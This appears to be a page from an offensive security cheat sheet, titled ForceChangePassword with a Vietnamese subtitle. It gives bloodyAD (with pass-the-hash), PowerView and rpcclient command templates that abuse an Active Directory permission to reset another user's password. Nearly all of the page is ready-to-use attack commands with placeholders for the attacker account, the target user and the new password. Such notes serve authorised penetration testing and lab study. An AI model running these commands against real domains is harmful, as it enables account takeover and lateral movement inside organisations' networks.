# ForceChangePassword

Đổi mật khẩu người dùng

#### Windows/Linux

{% code overflow="wrap" %}

```
bloodyAD --host <ip> -d <domain> -u <attackeruser> -p :<hash> set password <targetuser> <newpassword>
```

{% endcode %}

#### Windows

```
$NewPassword = ConvertTo-SecureString '<newpassword>' -AsPlainText -Force
Set-DomainUserPassword -Identity '<targetuser>' -AccountPassword $NewPassword
```

#### Linux

{% code overflow="wrap" %}

```
rpcclient -U '<attackeruser>%<password>' -W <domain> -c "setuserinfo2 <targetuser> 23 <newpassword>"
```

{% endcode %}
